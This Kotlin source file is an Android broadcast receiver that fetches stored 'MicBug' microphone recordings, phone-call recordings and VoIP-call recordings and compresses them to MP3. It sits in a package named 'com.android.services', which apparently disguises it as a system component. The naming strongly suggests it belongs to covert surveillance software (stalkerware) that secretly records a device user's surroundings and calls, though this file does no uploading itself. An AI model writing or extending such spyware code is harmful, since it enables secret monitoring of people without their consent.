package com.android.services.receiver

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import com.android.services.db.entities.CallRecording
import com.android.services.db.entities.MicBug
import com.android.services.db.entities.VoipCall
import com.android.services.util.AppConstants
import com.android.services.util.AppUtils
import com.android.services.util.AudioCompressionUtil
import com.android.services.util.InjectorUtils
import com.android.services.util.logException
import com.android.services.util.logVerbose
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.GlobalScope
import kotlinx.coroutines.async
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import java.io.File

class AudioFileCompressorReceiver : BroadcastReceiver() {
    companion object {
        const val ACTION_COMPRESS_AUDIO = "ACTION_COMPRESS_AUDIO"
    }

    override fun onReceive(context: Context, intent: Intent?) {
        intent?.let {
            if (it.action == ACTION_COMPRESS_AUDIO) {
                GlobalScope.launch(Dispatchers.Default) {
                    try {
                        val micBugs = fetchMicBugs(context)
                        val callRecordings = fetchCallRecordings(context)
                        val voipCallRecordings = fetchVoipCallRecordings(context)
                        if (micBugs.isNotEmpty()) {
                            logVerbose(
                                "${AppConstants.MIC_BUG_TYPE} compressing audio File",
                                AppConstants.MIC_BUG_TYPE
                            )
                            for (micBug in micBugs) {
                                val compressJob = async {
                                    compressFile(
                                        context,
                                        micBug.file,
                                        AppConstants.MIC_BUG_TYPE
                                    )
                                }
                                compressJob.await()
                            }
                        }
                        if (callRecordings.isNotEmpty()) {
                            logVerbose(
                                "${AppConstants.CALL_RECORD_TYPE} compressing audio File",
                                AppConstants.CALL_RECORD_TYPE
                            )
                            for (callRecording in callRecordings) {
                                val compressJob = async {
                                    compressFile(
                                        context,
                                        callRecording.file,
                                        AppConstants.CALL_RECORD_TYPE
                                    )
                                }
                                compressJob.await()
                            }
                        }
                        if (voipCallRecordings.isNotEmpty()) {
                            logVerbose(
                                "${AppConstants.VOIP_CALL_TYPE} compressing audio File",
                                AppConstants.VOIP_CALL_TYPE
                            )
                            for (voipCallRecording in voipCallRecordings) {
                                val compressJob = async {
                                    compressFile(
                                        context,
                                        voipCallRecording.file,
                                        AppConstants.VOIP_CALL_TYPE
                                    )
                                }
                                compressJob.await()
                            }
                        }

                    } catch (exp: Exception) {
                        logException(
                            "${AppConstants.SCREEN_RECORDING_TYPE} compressing exp = ${exp.message}",
                            throwable = exp
                        )
                    }
                }
            }
        }
    }

    private fun compressFile(context: Context, file: String, logType: String) {
        var destFile =
            "${file.substringBeforeLast("/")}/${AppUtils.generateUniqueID()}_${
                file.substringAfterLast("/")
            }"
        destFile=destFile.replace(".mrc",".mp3")
        AudioCompressionUtil.compressAudio(context,file, destFile, logType)
    }

    private fun reNameFile(file: String, newSourceFile: String) {
        val inputFile=File(file)
        val outputFile=File(newSourceFile)
        inputFile.renameTo(outputFile)
    }
    private suspend fun fetchMicBugs(context: Context): List<MicBug> {
        return withContext(Dispatchers.IO) {
            InjectorUtils.provideMicBugRepository(context)
                .selectUnCompressedMicBugs()
        }
    }

    private suspend fun fetchCallRecordings(context: Context): List<CallRecording> {
        return withContext(Dispatchers.IO) {
            InjectorUtils.provideCallRecordRepository(context)
                .selectUnCompressedCallRecording()
        }
    }

    private suspend fun fetchVoipCallRecordings(context: Context): List<VoipCall> {
        return withContext(Dispatchers.IO) {
            InjectorUtils.provideVoipCallRepository(context)
                .selectUnCompressedVoipCalls()
        }
    }
}